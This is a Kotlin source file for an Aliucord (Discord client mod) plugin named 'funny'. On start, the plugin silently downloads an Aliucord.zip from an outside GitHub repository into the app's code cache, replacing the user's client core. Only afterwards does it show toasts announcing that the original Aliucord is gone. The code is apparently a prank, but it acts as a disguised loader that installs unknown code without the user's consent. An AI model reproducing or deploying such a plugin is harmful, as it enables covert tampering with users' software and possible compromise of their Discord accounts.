package om.ega.sunkey.explode

import android.content.Context
import java.io.File
import com.aliucord.annotations.AliucordPlugin
import com.aliucord.entities.Plugin
import com.aliucord.Http
import com.aliucord.Utils

@AliucordPlugin(requiresRestart = true)
class funny : Plugin() {
    override fun start(c: Context) {
    	Utils.threadPool.execute { 
		Http.simpleDownload("https://github.com/OmegaSunkey/funnyallahcordtest/raw/builds/Aliucord.zip", File(c.getCodeCacheDir(), "Aliucord.zip"))
	}
	Utils.showToast("Lets play something funny!")
	Utils.showToast("You no longer have original Aliucord")
    }
    override fun stop(c: Context) {
    	//nop
    }
}
